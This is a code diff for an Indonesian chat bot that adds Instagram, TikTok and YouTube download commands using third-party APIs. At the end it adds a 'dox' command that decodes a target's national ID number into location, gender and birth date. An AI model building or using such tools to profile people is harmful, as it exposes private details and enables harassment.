+    } catch (e) {
+    console.error(e);
+    await reply(`*Maintance. . .*`);
+  }
+  }
+  break
+  
+  case 'ig': 
+  case 'instagram':{
+    if (!text) return reply('[!] link...!')
+            reply('[!] Wait Result...')
+                  let url = `https://api.alfixd.my.id/api/igdl?url=${encodeURIComponent(text)}`;
+  try {
+    const res = await fetch(url);
+    const response = await res.json();
+
+    if (response.status && response.result && response.result.length > 0) {
+      for (const media of response.result) {
+        const { username, caption, type, download_url, thumbnail } = media;
+        const cap = `Downloaded from Instagram by @${username || 'N/A'}\n\nCaption:\n${caption || 'No caption.'}`;
+
+        if (type === 'mp4') {
+                    await alfixd.replyWithVideo({
+                url: download_url,
+                   }, {
+                caption: cap
+            }
+        )
+    } else {
+    await alfixd.replyWithPhoto({
+    url: download_url,
+    }, {
+                caption: cap
+            }
+        )
+    }
+    }
+ } else {
+      reply(`Gagal mengunduh dari Instagram`);
+    }
+    } catch (e) {
+    console.error(e);
+    await reply(`*Maintenance...*`);
+  }
+  }
+  break
+
+case 'tiktok': {
+    if (!text) return reply('[!] Masukkan link TikTok!');
+    await reply('🔍 Mengambil data...');
+
+    try {
+        const url = `https://api.alfixd.my.id/api/ttdl?url=${encodeURIComponent(text)}`;
+        const res = await fetch(url);
+        const response = await res.json();
+
+        if (!response.status) return reply('❌ Gagal mengambil data dari API.');
+
+        const { title, music_info, data, source, author } = response;
+
+        const captionVideo = `🎬 *${title}*\n👤 *Author:* ${author?.nickname || '-'}\n📎 *Source:* ${source}\n\nPOWERED BY AlfiXD`;
+        const captionAudio = `🎵 *${music_info.title}*\n👤 *By:* ${music_info.author}\n\nPOWERED BY AlfiXD`;
+
+        const videoHD = data.find(x => x.type === 'nowatermark_hd');
+        const videoSD = data.find(x => x.type === 'nowatermark');
+        const photoList = data.filter(x => x.type === 'photo');
+
+        // 📸 Kirim foto (jika ada dan tidak ada video)
+        if (photoList.length > 0 && !videoHD && !videoSD) {
+            for (const photo of photoList) {
+                await alfixd.replyWithPhoto({ url: photo.url });
+            }
+        }
+
+        // 🎞️ Kirim video (prioritaskan HD)
+        const videoToSend = videoHD?.url || videoSD?.url;
+        if (videoToSend) {
+            await alfixd.replyWithVideo({
+                url: videoToSend
+            }, {
+                caption: captionVideo,
+                parse_mode: 'Markdown'
+            });
+        }
+
+        // 🎧 Kirim audio (jika ada)
+        if (music_info?.url) {
+            const audioBuffer = Buffer.from((await axios.get(music_info.url, {
+                responseType: 'arraybuffer'
+            })).data);
+
+            await alfixd.replyWithAudio({
+                source: audioBuffer,
+                filename: `${title}.mp3`
+            }, {
+                caption: captionAudio,
+                parse_mode: 'Markdown'
+            });
+        }
+
+    } catch (err) {
+        console.error(err);
+        reply('❌ Terjadi kesalahan saat mengambil data TikTok.');
+    }
+}
+    break;
+    
+case 'ytv':
+case 'youtube':
+case 'yt': {
+  if (!text) return reply('❗ Masukkan URL YouTube.\n\nContoh:\n.ytv https://youtu.be/dQw4w9WgXcQ 720');
+
+  const parts = text.trim().split(' ');
+  const ytUrl = parts[0];
+  const quality = (parts[1] && /^\d{3,4}$/.test(parts[1])) ? parts[1] : '480';
+
+  reply('⏳ Sedang memproses video, mohon tunggu sebentar...');
+
+  try {
+    const validQuality = {
+      "480": 480,
+      "720": 720,
+      "1080": 1080,
+      "360": 360,
+      "audio": "mp3"
+    };
+
+    if (!validQuality[quality]) return reply(`❌ Kualitas tidak valid!\nPilih: ${Object.keys(validQuality).join(', ')}`);
+
+    const qualityCode = validQuality[quality];
+
+    const axios = require('axios');
+    const firstReq = await axios.get(
+      `https://p.oceansaver.in/ajax/download.php?button=1&start=1&end=1&format=${qualityCode}&iframe_source=https://allinonetools.com/&url=${encodeURIComponent(ytUrl)}`,
+      {
+        timeout: 30000,
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
+      }
+    );
+
+    if (!firstReq.data || !firstReq.data.progress_url) return reply('❌ Gagal memulai proses download.');
+
+    const { progress_url } = firstReq.data;
+    let result;
+    let attempts = 0;
+    const max = 40;
+
+    while (attempts < max) {
+      await new Promise(res => setTimeout(res, 3000));
+      const poll = await axios.get(progress_url, {
+        timeout: 15000,
+        headers: { 'User-Agent': 'Mozilla/5.0' }
+      });
+
+      if (poll.data?.download_url) {
+        result = poll.data;
+        break;
+      }
+
+      attempts++;
+    }
+
+    if (!result?.download_url) return reply('❌ Timeout: Gagal mendapatkan link download.');
+
+    const title = firstReq.data.info?.title || 'Tanpa Judul';
+    const thumb = firstReq.data.info?.image || null;
+
+    const caption = `📥 *YOUTUBE VIDEO*
+🎬 Judul: ${title}
+🎞️ Kualitas: ${quality}
+🔗 Source: ${ytUrl}
+
+Powered by AlfiXD`;
+
+    await alfixd.replyWithVideo({ url: result.download_url }, { caption });
+
+  } catch (err) {
+    reply(`❌ Terjadi error:\n${err.message}`);
+  }
+}
+break;
+
+case 'yta':
+case 'ytaudio': {
+  if (!text) return reply('[ Contoh ] : .yta <link youtube>');
+
+  reply('🔊 Sedang memproses audio, mohon tunggu...');
+
+  try {
+    const url = `https://api.alfixd.my.id/api/ytdl?url=${encodeURIComponent(text)}&format=mp3`;
+    const res = await fetch(url);
+    const response = await res.json();
+
+    if (response.status && response.result && response.result.type === 'audio') {
+      const { title, download_url } = response.result;
+      await alfixd.replyWithAudio({ url: download_url, filename: title + '.mp3' }, {
+        caption: `🎵 Judul: ${title}`,
+        parse_mode: 'Markdown'
+      });
+    } else {
+      throw new Error('Gagal mengambil audio.');
+    }
+  } catch (err) {
+    console.error(err);
+    reply('❌ Gagal mengunduh audio: ' + err.message);
+  }
+  }
+  break;
+
+case 'nikparser': case 'dox':
+if (!isCreator) return reply("khusus alfixd")
+if (!q) return reply(`</> Anda harus mendapatkan nik target terlebih dahulu dan lakukan command seperti ini : ${prefix + command} 16070xxxxx\n\n`)
+const { nikParser } = require('nik-parser')
+const ktp = q
+const nik = nikParser(ktp)
+reply(`Nik: ${nik.isValid()}\nProvinsi ID: ${nik.provinceId()}\nNama Provinsi: ${nik.province()}\nKabupaten ID: ${nik.kabupatenKotaId()}\nNama Kabupaten: ${nik.kabupatenKota()}\nKecamatan ID: ${nik.kecamatanId()}\nNama Kecamatan: ${nik.kecamatan()}\nKode Pos: ${nik.kodepos()}\nJenis Kelamin: ${nik.kelamin()}\nTanggal Lahir: ${nik.lahir()}\nUniqcode: ${nik.uniqcode()}`)
+break
+
 
             default:
         }
